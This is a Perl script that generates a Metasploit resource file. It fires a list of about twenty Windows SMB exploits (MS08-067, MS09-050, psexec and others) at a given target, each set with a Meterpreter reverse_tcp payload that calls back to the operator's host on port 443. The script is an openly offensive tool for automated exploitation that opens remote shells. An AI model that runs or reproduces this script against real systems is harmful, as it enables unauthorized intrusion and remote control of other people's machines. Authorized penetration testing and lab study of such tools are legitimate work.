if (@ARGV < 2)
	{
	    print "Usage: ./msf_smb_exploit.pl source target > msf_smb_exploit.rc\n";
	} else {

	$source=$ARGV[0];
	$source_port="443";
	$target=$ARGV[1];
	@exploits =("use exploit/windows/smb/ms09_050_smb2_negotiate_func_index","use windows/smb/ms08_067_netapi","use exploit/windows/smb/ms03_049_netapi","use exploit/windows/smb/ms06_040_netapi","use exploit/windows/smb/ms06_070_wkssvc","use exploit/windows/smb/ipass_pipe_exec","use exploit/windows/smb/ms04_007_killbill","use exploit/windows/smb/ms04_011_lsass","use exploit/windows/smb/ms04_031_netdde","use exploit/windows/smb/ms05_039_pnp","use exploit/windows/smb/ms06_025_rasmans_reg","use exploit/windows/smb/ms06_025_rras","use exploit/windows/smb/ms06_040_netapi","use exploit/windows/smb/ms06_066_nwapil","use exploit/windows/smb/ms06_066_nwwks","use exploit/windows/smb/ms10_061_spoolss","use exploit/windows/smb/psexec","use exploit/windows/smb/psexec_psh","use exploit/windows/smb/smb_relay","use exploit/windows/smb/timbuktu_plughntcommand_bof");

foreach $exploit(@exploits) {
print $exploit."\n";
print "set PAYLOAD windows/meterpreter/reverse_tcp"."\n";
print "set LHOST ".$source."\n";
print "set LPORT ".$source_port."\n";
print "set RHOSTS ".$target."\n";
print "spool off"."\n";
print "run"."\n";
print "\n";
}

print "sessions -l"."\n";

	}
